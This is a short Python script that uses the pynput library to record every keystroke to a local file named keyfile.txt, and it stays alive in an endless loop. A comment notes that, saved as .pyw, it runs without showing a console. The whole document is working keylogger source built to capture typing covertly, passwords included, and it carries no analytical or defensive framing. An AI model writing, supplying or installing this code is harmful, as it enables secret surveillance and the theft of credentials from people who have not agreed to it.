from pynput import keyboard
import time

def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            logKey.write(f" [{key}] ")

# Start the listener
listener = keyboard.Listener(on_press=keyPressed)
listener.start()

# Keep the script alive without showing console (when saved as .pyw)
while True:
    time.sleep(10)
